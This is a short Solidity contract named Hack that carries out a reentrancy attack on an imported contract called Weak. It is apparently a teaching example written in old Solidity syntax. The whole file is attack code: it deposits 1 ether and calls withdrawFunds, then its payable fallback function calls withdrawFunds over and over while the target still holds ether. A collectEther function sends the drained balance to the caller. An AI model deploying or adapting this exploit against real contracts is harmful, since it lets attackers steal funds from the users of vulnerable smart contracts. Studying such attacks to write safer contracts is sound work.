import "Weak.sol";

contract Hack {
    Weak public weak;

    // Initialise the weak variable with the contract address 
    constructor(address _weakStoreAddress) {
        weak = Weak(_weakStoreAddress);
    }

    function pwnWeakStore() public payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        weak.depositFunds.value(1 ether)();
        // Start the magic
        weak.withdrawFunds(1 ether); 
    }
    
    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    // Fallback function - where the magic happens
    function () payable {
        if (weak.balance > 1 ether) {
            weak.withdrawFunds(1 ether);
        }
    }
}